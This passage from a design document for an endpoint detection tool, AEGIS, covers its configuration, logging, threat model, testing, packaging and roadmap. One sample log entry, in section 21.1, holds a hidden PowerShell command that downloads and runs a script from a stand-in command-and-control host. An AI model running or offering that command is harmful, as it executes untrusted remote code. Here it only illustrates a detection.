- **Top Bar**: Hostname, Agent Status, Database size, Rule counts.
- **Left Column**: System process listing with color-coded risk flags.
- **Right Column**: Live connection monitoring and detailed alert panels.

### 19.3 Fleet Web Console
- **Agent Enrollment**: Quick deployment tracking dashboard.
- **Interactive Map**: Displays threat metrics across remote endpoints.
- **Rule Deployer**: Syncs rule folders to selected endpoints instantly.

---

## 20. Configuration

### 20.1 Default Configuration Layout (`aegis.yaml`)
```yaml
agent:
  id: "agent-1234-abcd"
  log_level: "info"
  ipc_socket: "/var/run/aegis.sock"
  heartbeat_interval_seconds: 30

telemetry:
  process_monitoring: true
  file_monitoring: true
  registry_monitoring: true # Windows only
  network_monitoring: true
  usb_monitoring: true

engines:
  hash_reputation:
    enabled: true
    db_path: "/var/lib/aegis/reputation.db"
  yara:
    enabled: true
    rules_dir: "/etc/aegis/rules/yara"
  sigma:
    enabled: true
    rules_dir: "/etc/aegis/rules/sigma"
  heuristics:
    entropy_threshold: 7.2

storage:
  path: "/var/lib/aegis/telemetry.db"
  retention_days: 7
  max_size_mb: 500

response:
  auto_mitigation: false
  risk_threshold: 8.5
  actions:
    - name: "isolate_network"
      enabled: true
    - name: "kill_process"
      enabled: true
```

### 20.2 Operational Profiles
- **Lightweight**: Disables memory entropy scanning and file modification hash calculations. Reduces resource footprint.
- **Forensic**: Captures file access events (read/write/open) and enables system memory tracing.
- **Aggressive**: Enables automated process tree containment rules for risk scores above 7.0.

---

## 21. Logging & Telemetry

### 21.1 Logging Model
AEGIS generates structured JSON logs to facilitate log forwarding:
```json
{
  "level": "warn",
  "timestamp": "2026-07-11T09:04:13.999Z",
  "caller": "detect/sigma.go:120",
  "msg": "Sigma rule trigger match",
  "data": {
    "rule_name": "PowerShell_DownloadString",
    "mitre_id": "T1059.001",
    "pid": 5002,
    "cmdline": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://bad.c2/payload.ps1')"
  }
}
```

### 21.2 Metrics Collection
Exposes standard Prometheus-compatible telemetry metrics locally:
- `aegis_events_total`: Cumulative counter of raw system events captured.
- `aegis_alerts_total`: Cumulative counter of alerts generated, partitioned by engine type.
- `aegis_cpu_percent`: Instantaneous CPU utilization of the daemon.
- `aegis_memory_bytes`: Instantaneous RAM utilization of the daemon.

---

## 22. Security Model

### 22.1 Threat Modeling & Mitigation
- **Threat Vector: Agent Termination**: Local malware running as administrator attempts to terminate the EDR process.
  - *Mitigation*: Windows registry protection blocks changes to the AEGIS service key. Linux watchdog daemon monitors the `aegisd` process and restarts it instantly if it is stopped.
- **Threat Vector: Rule Tampering**: Attacker modifies local YARA rule files to prevent detection.
  - *Mitigation*: The daemon validates cryptographic hash signatures of all rules against a trusted public key before loading them.

### 22.2 Cryptographic Key Management
- Local database configurations and credentials (e.g., API tokens) are encrypted using AES-256-GCM.
- Encryption keys are retrieved from OS-level secure storage backends:
  - Windows: DPAPI (Data Protection API).
  - macOS: Keychain.
  - Linux: Secret Service API or encrypted kernel keyring.

---

## 23. Performance

### 23.1 Optimization Targets
To maintain its lightweight footprint, AEGIS enforces strict performance boundaries:

| Resource | Baseline Target | Active Scan Target | Containment Event Target |
|---|---|---|---|
| **CPU Limit** | < 2% average | < 10% average | < 5% spike |
| **RAM Limit** | < 80MB | < 150MB | < 100MB |
| **Disk Write** | < 5MB/hour | < 50MB/hour (Burst) | < 1MB |

### 23.2 Congestion Management
If the queue fills up due to high system load:
- **Throttling**: The daemon drops duplicate file read/open events before process events.
- **Alert**: Writes a diagnostic drop alert to the audit log: `AEGIS_CONGESTION_EVENT_DROP`.

---

## 24. Testing Strategy

### 24.1 Verification Model
The testing strategy enforces testing across the compilation matrix:
- **Unit Testing**: Tests parsing logic (e.g., PE, ELF, YARA compiler wrappers) with mock system datasets.
- **Integration Testing**: Uses virtualized environments (Docker/Windows Sandbox) to execute simulated attack commands (e.g., spawning shellcode, modifying registry paths) to verify end-to-end telemetry capture.
- **Fuzz Testing**: Employs Go's native fuzzing engine to parse malformed PE file headers and invalid rule strings to identify memory corruption bugs.
- **Benchmark Testing**: Measures latency profiles of the event normalizer under simulated heavy event loads.

---

## 25. CI/CD Pipeline

### 25.1 Automation Workflows
All integration pipelines are implemented via GitHub Actions:
- **Lint Phase**: Verifies codebase formatting against strict rules:
  ```bash
  golangci-lint run ./...
  ```
- **Security Audit**: Vulnerability scanning of dependencies using `govulncheck` and static application security testing (SAST) using CodeQL.
- **Release Matrix**: Automated compilation pipelines building target binary formats for Windows, Linux, and macOS.
- **SBOM Generation**: Compiles Software Bill of Materials (SBOM) documentation using CycloneDX schema formats.

---

## 26. Packaging & Distribution

### 26.1 Distribution Formats
Compilation outputs target platform-native packaging structures:

```
                  +-----------------------------------+
                  |           MAKE RELEASE            |
                  +-----------------+-----------------+
                                    |
         +--------------------------+--------------------------+
         |                          |                          |
         v                          v                          v
+--------+--------+        +--------+--------+        +--------+--------+
|     Windows     |        |      Linux      |        |      macOS      |
|  (MSI / EXE)    |        |   (DEB / RPM)   |        |   (PKG / DMG)   |
|  [Winget/Choco] |        | [Systemd/Docker]|        |    [Homebrew]   |
+-----------------+        +-----------------+        +-----------------+
```

- **Windows**: Compiles standalone `.exe` installers wrapped into Windows MSI setup bundles.
- **Linux**: Build pipelines output `.deb` and `.rpm` files preconfigured to register `aegisd` under `systemd`.
- **macOS**: Standalone `.pkg` installers designed to register service daemons under `launchd`.

---

## 27. Development Standards

### 27.1 Engineering Guidelines
- **Clean Architecture**: System domain logic must remain isolated from OS-specific monitoring packages.
- **Domain-Driven Design (DDD)**: Code structures map directly to functional domains (e.g., `pkg/detect/signature` does not reference output components).
- **Commit Format**: All changes must follow the Conventional Commits specification:
  ```
  feat(monitor): add support for USB VID/PID parsing under Linux
  ```

---

## 28. Documentation Requirements

### 28.1 Project Manuals
- **User Guide**: Commands configuration, basic scanning runs, response playbook customization.
- **Developer Guide**: Details on how to write custom Go monitoring probes and compile WASM plugins.
- **API Reference**: Generates gRPC contracts, protobuf schema documentation, and API path details.

---

## 29. Release Strategy

### 29.1 Lifecycle Versioning
- **Semantic Versioning (SemVer 2.0.0)**: Major.Minor.Patch schema definitions.
- **Changelog**: Generated automatically from conventional commits.
- **Maintenance Policy**: LTS (Long-Term Support) versions receive security patches for 12 months post-release.

---

## 30. Roadmap

```
+--------------------------------------------------------------------------+
|  Phase 1: Core Architecture & Telemetry                                  |
|  (Daemon split, ETW/ESF/Auditd, SQLite storage, CLI Client)              |
+--------------------------------------------------------------------------+
                                     |
                                     v
+--------------------------------------------------------------------------+
|  Phase 2: Multi-Engine Detection                                         |
|  (YARA compiler, Sigma stream parser, Memory scanning heuristics)        |
+--------------------------------------------------------------------------+
                                     |
                                     v
+--------------------------------------------------------------------------+
|  Phase 3: Active Response & Forensics                                    |
|  (Firewall block, quarantine, process tree kill, timeline reports)       |
+--------------------------------------------------------------------------+
                                     |
                                     v
+--------------------------------------------------------------------------+
|  Phase 4: Swarm Operations & Dashboards                                  |
|  (Fleet console, central configurations, WASM plugins marketplace)      |
+--------------------------------------------------------------------------+
```

---

## 31. Future Ideas

### 31.1 Long-term Capabilities
- **eBPF Advanced Kernel Integration**: Complete migration of Linux event capture loops to eBPF maps to reduce context-switching overhead.
- **Kernel-Mode Driver (Windows)**: Kernel-level minifilter driver implementation to monitor and protect against bootkits and ransomware.
- **AI Threat Analyst Copilot**: An embedded, quantized model parser analyzing event timelines locally and presenting alert summaries to the CLI user.
- **SOAR / SIEM Connectors**: Native outputs configured for direct syslog forwarding, splunk-compatible formatting, and Sentinel integrations.
- **Swarm Intelligence**: Peer-to-peer alerting mechanism. If one agent blocks a malicious hash, it distributes the hash directly to peer agents across the subnet.